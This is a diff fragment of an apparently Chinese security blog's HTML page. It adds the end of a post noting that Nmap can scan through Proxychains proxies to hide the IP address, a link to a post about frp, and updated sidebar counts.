+<p>此时Nmap将使用Proxychains配置文件中的代理服务器进行扫描，实现IP地址的隐藏和匿名。</p>
+<h4 id="相关博客链接">相关博客链接</h4>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/frp/">https://su18.org/post/frp/</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://zls1793.github.io/2024/01/29/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1090,20 +1391,20 @@ ThinkPHP &gt;= 5.1.42</p>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">7</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
